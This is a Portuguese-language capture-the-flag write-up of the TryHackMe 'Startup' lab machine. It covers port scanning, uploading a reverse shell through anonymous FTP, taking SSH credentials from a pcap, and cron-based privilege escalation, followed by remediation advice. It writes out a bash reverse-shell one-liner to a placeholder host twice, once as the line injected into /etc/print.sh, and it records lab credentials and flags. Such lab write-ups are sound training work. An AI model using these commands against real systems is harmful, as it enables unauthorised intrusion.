# 1 — Visão geral da metodologia

1. **Objetivo:** comprovar exposição e comprometimento total do alvo (user + root).
    
2. **Estrutura:** Recon → Enumeração → Exploração → Acesso inicial → Privesc → Flags → Evidências.
    
3. **Princípios:** documentação completa e reprodutível.
    

---

# Report — Máquina: `Startup` — `10.64.188.136`

- **Fonte:** THM
    
- **Data:** 2025-11-28
    
- **Autor:** _Enrico Moreno_
    
- **Nível:** Easy
    
- **Início:** 16:50
    
- **Fim:** 18:20
    
- **Tempo gasto:** 1h 30m
    

---

## 1) Executive summary

Sistema vulnerável permitiu acesso inicial via **FTP anônimo** com upload e execução de shell remota. Arquivo de captura de tráfego (`pcapng`) revelou credenciais SSH → acesso a Lennie. Elevação de privilégio via **script de cron editável** resultou em shell root e flags obtidas.

---

## 2) Escopo e limitações

- **Alvo testado:** `10.64.188.136`
    
- **Serviços:** SSH, FTP, HTTP
    
- **Ferramentas:** Nmap, Searchsploit, Hydra, FTP, PCAP analysis, Shell reversa, cron privesc
    
- **Limitações:** nenhuma imposta pelo lab
    

---

## 3) Metodologia aplicada

- Recon de portas e serviços
    
- Enumeração web e FTP
    
- Acesso inicial via RCE por upload FTP
    
- Análise de tráfego (`pcap`) → credenciais SSH
    
- Privesc via cron job com permissão de escrita
    
- Root compromise + flags
    

---

## 4) Achado principal

**Vulnerabilidade:** FTP anônimo + upload executável  
**Local:** `/files/ftp/` → execução via HTTP  
**PoC resumida:**

`sh -i >& /dev/tcp/<SEU_IP>/4444 0>&1`

**Resultado:** reverse shell + acesso privilegiado via cron

---

## 5) Evidências / PoC (resumo)

**Scan inicial**

`nmap -Pn -sS -p- -T4 -sV 10.64.188.136 -oN ~/Desktop/Nmap_Startup.txt`

**Possíveis usuários do CVE-2016-6210**

`python3 40136.py -U unix_users.txt 10.64.188.136`

**FTP anônimo habilitado**  
→ upload de reverse shell  
→ execução pelo navegador

**Primeira flag**

- `/files/recipes.txt`
    

**Indicador de incidente**

- `suspecious.pcapng` em `/incidents/`
    

**Credenciais SSH extraídas da PCAP**

`user: lennie password: c4ntg3t3n0ughsp1c3`

**Flag user**

`cat ~/user.txt ➜ THM{03ce3d619b80ccbfb3b7fc81e46c0e79}`

**Privesc via cron**

`ls -l /etc/print.sh -rwx------ 1 lennie lennie 25 Nov 12 2020 /etc/print.sh`

→ substituído para reverse shell → root

**Root flag**

`THM{f963aaa6a430f210222158ae15c3d76d}`

---

## 6) Impacto & Severidade

**Severidade:** 🔴 **Crítica**

Execução arbitrária de comandos + credenciais expostas + privesc trivial = controle total, movimentação lateral possível, exposição total de dados internos.

---

## 7) Reproduzir (passo-a-passo)

1️⃣ Recon

`nmap -Pn -sS -p- -T4 -sV 10.64.188.136`

2️⃣ Acessar FTP anonimamente  
3️⃣ Upload de reverse shell  
4️⃣ Executar via HTTP → `/files/ftp/`  
5️⃣ Baixar e analisar `.pcapng`  
6️⃣ Acessar SSH:

`ssh lennie@10.64.188.136`

7️⃣ Privesc via cron

`echo 'sh -i >& /dev/tcp/<SEU_IP>/4444 0>&1' > /etc/print.sh`

8️⃣ Receber shell root e coletar flag

---

## 8) Recomendações (gestores)

- Desabilitar FTP anônimo imediatamente
    
- Proibir execução de uploads em diretórios web
    
- Monitorar e corrigir scripts de cron vulneráveis
    
- Implementar segregação adequada de logs e dados sensíveis
    

---

## 9) Recomendações técnicas

- Remover permissão de escrita do `print.sh`:
    

`chmod 700 /etc/print.sh chown root:root /etc/print.sh`

- Bloquear execução via uploads (`noexec`, `disable_php`)
    
- Revisar gerência de chaves SSH e hardening de serviços
    

---

## 10) Apêndice técnico

### Referências externas

- CVE-2016-6210 (OpenSSH user enumeration)
    
- reverse shell através de FTP
    
- PCAP credential harvesting
    

### Arquivos anexados recomendados

### Nmap
![](Nmap_Startup.txt)
### GoBuster
![](gobuster_Startup.txt)
### Screenshots

![](2025-11-30_17-15.png)
---

## 11) Lições aprendidas / Follow-up

- Sempre tentar serviços alternativos antes de brute-force
    
- PCAPs podem revelar credenciais críticas
    
- Cron jobs inseguros → vetor comum de privesc
    

---

## Extra: Pontos importantes para OSCP-style

✔ Exploração multivetorial registrada  
✔ Comandos completos  
✔ Flags identificadas e validadas  
✔ Caminho claro para mitigação
